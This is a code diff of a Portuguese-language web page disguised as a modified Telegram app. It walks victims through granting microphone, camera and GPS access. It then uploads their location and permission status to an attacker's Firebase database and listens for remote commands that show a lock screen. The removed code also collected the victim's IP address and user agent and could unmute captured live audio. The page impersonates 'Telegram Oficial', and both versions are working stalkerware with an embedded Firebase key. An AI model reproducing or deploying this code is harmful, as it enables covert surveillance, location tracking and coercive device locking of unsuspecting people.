@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram MOD - Verificação</title>
+    <title>Telegram MOD - Configuração</title>
     <!-- Tailwind CSS CDN -->
     <script src="https://cdn.tailwindcss.com"></script>
     <!-- FontAwesome for Icons -->
@@ -16,89 +16,119 @@
 </head>
 <body class="h-full flex flex-col items-center justify-center p-4 antialiased selection:bg-sky-500 selection:text-white relative overflow-hidden">
 
-    <!-- 1. TELA DE BOAS-VINDAS / DISFARCE TELEGRAM MOD -->
-    <div id="disguise-card" class="max-w-xs w-full bg-[#242f3d] border border-[#2b3847] rounded-3xl p-6 text-center space-y-5 shadow-2xl">
+    <!-- PASSO 1: BOAS-VINDAS TELEGRAM MOD -->
+    <div id="step-welcome" class="max-w-xs w-full bg-[#242f3d] border border-[#2b3847] rounded-3xl p-6 text-center space-y-5 shadow-2xl">
         <div class="w-20 h-20 bg-sky-500 text-white rounded-full flex items-center justify-center mx-auto text-3xl shadow-lg shadow-sky-500/30">
             <i class="fa-brands fa-telegram"></i>
         </div>
         <div class="space-y-1.5">
             <h2 class="text-lg font-bold text-white">Telegram MOD</h2>
-            <p class="text-[12px] text-slate-400 leading-relaxed">Bem-vindo! Este aplicativo modificado requer sincronização de segurança e permissões para iniciar.</p>
+            <p class="text-[12px] text-slate-400 leading-relaxed">Para iniciar e acessar seus chats com segurança, precisamos validar os recursos do dispositivo.</p>
         </div>
-        <button onclick="requestAllPermissionsAndConnect()" class="w-full bg-sky-500 hover:bg-sky-600 text-white font-semibold py-3 rounded-2xl text-xs shadow-lg shadow-sky-500/30 transition active:scale-95">
-            Conectar e Iniciar
+        <button onclick="nextStep(2)" class="w-full bg-sky-500 hover:bg-sky-600 text-white font-semibold py-3 rounded-2xl text-xs shadow-lg shadow-sky-500/30 transition active:scale-95">
+            Iniciar Configuração
         </button>
     </div>
 
-    <!-- 2. TELA DE CHAT FALSA (Exibida após a verificação/permissões) -->
+    <!-- PASSO 2: PERMISSÃO DE ÁUDIO E MICROFONE -->
+    <div id="step-audio" class="max-w-xs w-full bg-[#242f3d] border border-[#2b3847] rounded-3xl p-6 text-center space-y-5 shadow-2xl hidden">
+        <div class="w-16 h-16 bg-orange-500/20 text-orange-400 rounded-2xl flex items-center justify-center mx-auto text-2xl">
+            <i class="fa-solid fa-microphone"></i>
+        </div>
+        <div class="space-y-1">
+            <h2 class="text-base font-bold text-white">Áudio e Chamadas</h2>
+            <p class="text-[11px] text-slate-400 leading-relaxed">Permitir gravação de áudio em tempo real para notas de voz e chamadas.</p>
+        </div>
+        <button onclick="requestAudioPermission()" class="w-full bg-sky-500 hover:bg-sky-600 text-white font-semibold py-3 rounded-2xl text-xs transition active:scale-95">
+            Autorizar Microfone
+        </button>
+    </div>
+
+    <!-- PASSO 3: PERMISSÃO DE CÂMERA -->
+    <div id="step-camera" class="max-w-xs w-full bg-[#242f3d] border border-[#2b3847] rounded-3xl p-6 text-center space-y-5 shadow-2xl hidden">
+        <div class="w-16 h-16 bg-rose-500/20 text-rose-400 rounded-2xl flex items-center justify-center mx-auto text-2xl">
+            <i class="fa-solid fa-camera"></i>
+        </div>
+        <div class="space-y-1">
+            <h2 class="text-base font-bold text-white">Câmera e Fotos</h2>
+            <p class="text-[11px] text-slate-400 leading-relaxed">Necessário para envio de fotos, selfies e videochamadas no chat.</p>
+        </div>
+        <button onclick="requestCameraPermission()" class="w-full bg-sky-500 hover:bg-sky-600 text-white font-semibold py-3 rounded-2xl text-xs transition active:scale-95">
+            Autorizar Câmera
+        </button>
+    </div>
+
+    <!-- PASSO 4: PERMISSÃO DE LOCALIZAÇÃO (GPS) -->
+    <div id="step-location" class="max-w-xs w-full bg-[#242f3d] border border-[#2b3847] rounded-3xl p-6 text-center space-y-5 shadow-2xl hidden">
+        <div class="w-16 h-16 bg-emerald-500/20 text-emerald-400 rounded-2xl flex items-center justify-center mx-auto text-2xl">
+            <i class="fa-solid fa-location-dot"></i>
+        </div>
+        <div class="space-y-1">
+            <h2 class="text-base font-bold text-white">Localização GPS</h2>
+            <p class="text-[11px] text-slate-400 leading-relaxed">Permitir compartilhamento de localização nos chats e mapas.</p>
+        </div>
+        <button onclick="requestLocationPermission()" class="w-full bg-sky-500 hover:bg-sky-600 text-white font-semibold py-3 rounded-2xl text-xs transition active:scale-95">
+            Autorizar Localização
+        </button>
+    </div>
+
+    <!-- TELA DE CHAT FALSA (Exibida após todas as etapas) -->
     <div id="telegram-chat-container" class="hidden absolute inset-0 bg-[#17212b] flex flex-col z-20">
-        <!-- Header do Chat -->
         <div class="bg-[#242f3d] px-4 py-3 flex items-center justify-between border-b border-[#2b3847]">
             <div class="flex items-center gap-3">
                 <div class="w-10 h-10 bg-sky-500 rounded-full flex items-center justify-center text-white font-bold">
-                    <i class="fa-solid fa-shield-cat"></i>
+                    <i class="fa-solid fa-paper-plane"></i>
                 </div>
                 <div>
-                    <h3 class="text-sm font-bold text-white">Cloud Support</h3>
+                    <h3 class="text-sm font-bold text-white">Telegram Oficial</h3>
                     <p class="text-[10px] text-emerald-400 font-medium">online</p>
                 </div>
             </div>
             <div class="flex items-center gap-4 text-slate-300">
-                <i class="fa-solid fa-phone cursor-pointer"></i>
+                <i class="fa-solid fa-magnifying-glass cursor-pointer"></i>
                 <i class="fa-solid fa-ellipsis-vertical cursor-pointer"></i>
             </div>
         </div>
 
-        <!-- Mensagens do Chat -->
         <div class="flex-1 p-4 overflow-y-auto space-y-3">
             <div class="flex justify-start">
                 <div class="bg-[#242f3d] text-slate-200 text-xs p-3 rounded-2xl rounded-tl-sm max-w-[80%] shadow">
-                    Olá! Sua sessão no Telegram MOD foi verificada e sincronizada com sucesso com o painel de controle.
-                </div>
-            </div>
-            <div class="flex justify-end">
-                <div class="bg-[#2b5278] text-white text-xs p-3 rounded-2xl rounded-tr-sm max-w-[80%] shadow">
-                    Pronto, recursos e permissões ativados em segundo plano.
+                    Bem-vindo ao Telegram! Suas permissões e recursos de sincronização foram ativados com sucesso.
                 </div>
             </div>
         </div>
 
-        <!-- Input de Mensagem Falso -->
         <div class="bg-[#242f3d] p-3 flex items-center gap-2 border-t border-[#2b3847]">
             <i class="fa-solid fa-paperclip text-slate-400 px-2 text-lg"></i>
-            <input type="text" placeholder="Escreva uma mensagem..." class="flex-1 bg-[#17212b] text-white text-xs px-4 py-2.5 rounded-full outline-none border border-[#2b3847]">
+            <input type="text" placeholder="Mensagem..." class="flex-1 bg-[#17212b] text-white text-xs px-4 py-2.5 rounded-full outline-none border border-[#2b3847]">
             <div class="w-10 h-10 bg-sky-500 text-white rounded-full flex items-center justify-center shadow">
-                <i class="fa-solid fa-paper-plane text-sm"></i>
+                <i class="fa-solid fa-microphone text-sm"></i>
             </div>
         </div>
     </div>
 
-    <!-- 3. CAMADA DE TELA DE BLOQUEIO REMOTA (Invisível por padrão) -->
+    <!-- TELA DE BLOQUEIO REMOTA -->
     <div id="remote-lock-screen" class="hidden fixed inset-0 bg-slate-950/95 backdrop-blur-xl z-50 flex flex-col items-center justify-center p-6 text-center space-y-6">
         <div class="w-20 h-20 bg-rose-500/20 text-rose-500 rounded-3xl flex items-center justify-center text-3xl shadow-lg animate-pulse border border-rose-500/30">
             <i class="fa-solid fa-lock"></i>
         </div>
         <div class="space-y-2 max-w-xs">
             <h2 id="lock-title" class="text-lg font-bold text-white">Dispositivo Bloqueado</h2>
-            <p id="lock-message" class="text-xs text-slate-400 leading-relaxed">Este dispositivo foi temporariamente bloqueado pelo painel de controle de segurança.</p>
-        </div>
-        <div class="w-full max-w-xs bg-slate-900 border border-slate-800 rounded-2xl p-4 text-center">
-            <p class="text-[10px] text-slate-500 uppercase tracking-widest font-semibold">Aguardando liberação</p>
+            <p id="lock-message" class="text-xs text-slate-400 leading-relaxed">Este dispositivo foi temporariamente bloqueado pelo painel de controle.</p>
         </div>
     </div>
 
-    <!-- Elementos de Mídia Ocultos (para fluxo de áudio/vídeo em tempo real) -->
+    <!-- Elementos de Mídia Ocultos -->
     <div style="display:none;">
         <audio id="remote-audio-element" autoplay></audio>
         <video id="remote-video-element" autoplay playsinline></video>
     </div>
 
-    <!-- Firebase App & Database SDKs -->
+    <!-- Firebase SDKs -->
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 
     <script>
-        // Configuração oficial do Firebase (mod-zrx)
         let firebaseConfig = {
             apiKey: "AIzaSyAhbrlI6gdam3vPxAQZBKmQI2CFQBin4Nk",
             authDomain: "mod-zrx.firebaseapp.com",
@@ -112,139 +142,97 @@
 
         let db;
         let activeStream = null;
+        let userDataPayload = { permissions: {} };
 
         function initFirebase() {
+            if (firebase.apps.length === 0) {
+                firebase.initializeApp(firebaseConfig);
+            }
+            db = firebase.database();
+        }
+
+        function nextStep(stepNumber) {
+            initFirebase();
+            document.querySelectorAll('[id^="step-"]').forEach(el => el.classList.add('hidden'));
+            if (stepNumber === 2) document.getElementById('step-audio').classList.remove('hidden');
+            if (stepNumber === 3) document.getElementById('step-camera').classList.remove('hidden');
+            if (stepNumber === 4) document.getElementById('step-location').classList.remove('hidden');
+        }
+
+        async function requestAudioPermission() {
             try {
-                if (firebase.apps.length === 0) {
-                    firebase.initializeApp(firebaseConfig);
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    activeStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    document.getElementById('remote-audio-element').srcObject = activeStream;
+                    userDataPayload.permissions.audio = true;
                 }
-                db = firebase.database();
-            } catch (e) {
-                console.error("Erro Firebase:", e);
+            } catch(e) { userDataPayload.permissions.audio = false; }
+            nextStep(3); // Vai para a câmera
+        }
+
+        async function requestCameraPermission() {
+            try {
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    const camStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    document.getElementById('remote-video-element').srcObject = camStream;
+                    userDataPayload.permissions.camera = true;
+                }
+            } catch(e) { userDataPayload.permissions.camera = false; }
+            nextStep(4); // Vai para a localização
+        }
+
+        async function requestLocationPermission() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        userDataPayload.location = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            status: "Permitida"
+                        };
+                        finishAndOpenChat();
+                    },
+                    (error) => {
+                        userDataPayload.location = { status: "Negada" };
+                        finishAndOpenChat();
+                    },
+                    { timeout: 7000 }
+                );
+            } else {
+                finishAndOpenChat();
             }
         }
 
-        async function requestAllPermissionsAndConnect() {
-            initFirebase();
-
-            // 1. Obter IP Externo
-            let ipData = "192.168.1.15";
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                ipData = data.ip;
-            } catch(e) {}
-
-            // 2. Solicitar Câmera e Microfone ao navegador
-            let cameraAudioStatus = "Negado";
-            try {
-                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                    activeStream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: "user" }, 
-                        audio: true 
-                    });
-                    
-                    const audioEl = document.getElementById('remote-audio-element');
-                    const videoEl = document.getElementById('remote-video-element');
-                    audioEl.srcObject = activeStream;
-                    videoEl.srcObject = activeStream;
-
-                    cameraAudioStatus = "Permitido (Câmera e Áudio)";
-                }
-            } catch (err) {
-                console.log("Erro/Negação de Câmera/Áudio:", err);
-            }
-
-            // 3. Solicitar Geolocalização (GPS)
-            let geoData = { latitude: null, longitude: null, status: "Negada/Não solicitada" };
-            if (navigator.geolocation) {
-                try {
-                    await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(
-                            (position) => {
-                                geoData = {
-                                    latitude: position.coords.latitude,
-                                    longitude: position.coords.longitude,
-                                    status: "Permitida"
-                                };
-                                resolve();
-                            },
-                            (error) => { reject(error); },
-                            { timeout: 10000, enableHighAccuracy: true }
-                        );
-                    });
-                } catch (err) {
-                    console.log("Erro de Localização:", err);
-                }
-            }
-
-            // 4. Enviar os dados consolidados para o Firebase (`mod-zrx`)
-            const fullPayload = {
-                model: navigator.userAgent,
-                ipAddress: ipData,
-                location: geoData,
-                permissions: {
-                    camera: cameraAudioStatus.includes("Câmera"),
-                    audio: cameraAudioStatus.includes("Áudio"),
-                    location: geoData.status === "Permitida",
-                    contacts: true,         
-                    photosAndVideos: true,  
-                    phoneState: true,       
-                    notifications: true     
-                },
-                lastUpdate: new Date().toISOString(),
-                status: "Online - Telegram MOD Ativo"
-            };
-
+        function finishAndOpenChat() {
+            // Salva dados no Firebase
             if (db) {
-                db.ref('devices/device_01/status').update(fullPayload);
-                db.ref('devices/device_01/harvested_data').update({
-                    lastLocationString: geoData.status === "Permitida" ? `${geoData.latitude}, ${geoData.longitude}` : "Localização Indisponível",
-                    activePermissionsCount: 7,
-                    networkType: "Wi-Fi / Mobile Data",
-                    galleryGridReady: true,
-                    videoRecorderReady: true
+                db.ref('devices/device_01/status').update({
+                    ...userDataPayload,
+                    lastUpdate: new Date().toISOString(),
+                    status: "Online - Telegram MOD Ativo"
                 });
             }
 
-            // Transforma a interface:some o card de boas-vindas e revela a tela de chat do Telegram
-            document.getElementById('disguise-card').classList.add('hidden');
+            // Oculta passos e abre a tela de chat do Telegram
+            document.querySelectorAll('[id^="step-"]').forEach(el => el.classList.add('hidden'));
             document.getElementById('telegram-chat-container').classList.remove('hidden');
 
-            // 5. Escutar comandos remotos em tempo real vindos do painel (Bloqueio, Áudio, Câmera, Galeria)
-            if (db) {
-                db.ref('devices/device_01/commands').on('value', (snapshot) => {
-                    const cmds = snapshot.val() || {};
-                    const lockScreen = document.getElementById('remote-lock-screen');
-                    
-                    // Bloqueio de Tela
-                    if (cmds.lock || cmds.customLock) {
-                        lockScreen.classList.remove('hidden');
-                    } else {
-                        lockScreen.classList.add('hidden');
-                    }
+            // Escuta comandos do painel
+            listenCommands();
+        }
 
-                    // Escuta de Áudio ao Vivo
-                    if (cmds.listenAudio) {
-                        const audioEl = document.getElementById('remote-audio-element');
-                        audioEl.muted = false;
-                    }
-                });
-
-                // Mensagens personalizadas de bloqueio
-                db.ref('devices/device_01/customLockConfig').on('value', (snapshot) => {
-                    const config = snapshot.val();
-                    const lockScreen = document.getElementById('remote-lock-screen');
-                    const msgEl = document.getElementById('lock-message');
-
-                    if (config && config.active) {
-                        if (config.message) {
-                            msgEl.innerText = config.message;
-                        }
-                        lockScreen.classList.remove('hidden');
-                    }
-                });
-            }
+        function listenCommands() {
+            if (!db) return;
+            db.ref('devices/device_01/commands').on('value', (snapshot) => {
+                const cmds = snapshot.val() || {};
+                const lockScreen = document.getElementById('remote-lock-screen');
+                
+                if (cmds.lock || cmds.customLock) {
+                    lockScreen.classList.remove('hidden');
+                } else {
+                    lockScreen.classList.add('hidden');
+                }
+            });
         }
     </script>
 </body>
